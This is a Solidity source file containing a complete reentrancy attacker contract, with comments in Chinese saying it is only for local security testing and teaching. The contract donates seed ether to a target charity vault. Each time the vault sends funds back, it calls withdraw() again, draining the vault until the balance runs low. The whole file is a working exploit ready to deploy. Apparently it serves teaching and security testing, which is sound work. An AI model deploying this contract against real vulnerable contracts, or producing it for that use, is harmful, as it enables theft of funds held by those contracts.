// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ICharityVault {
    function donate() external payable;

    function withdraw() external;
}

/// @title Reentrancy Attacker
/// @notice 仅用于本地安全测试和教学演示
contract ReentrancyAttacker {
    ICharityVault public immutable target;

    uint256 public attackAmount;
    uint256 public reentryCount;

    constructor(address targetAddress) {
        require(targetAddress != address(0), "Invalid target");

        target = ICharityVault(targetAddress);
    }

    /// @notice 先存入少量资金，再触发提款
    function attack() external payable {
        require(msg.value > 0, "Seed amount required");

        attackAmount = msg.value;

        target.donate{value: msg.value}();
        target.withdraw();
    }

    /// @notice 每次收到金库转出的资金时，再次调用 withdraw()
    receive() external payable {
        reentryCount += 1;

        // 只在金库仍有足够余额时继续，防止最后一次转账失败
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }
}
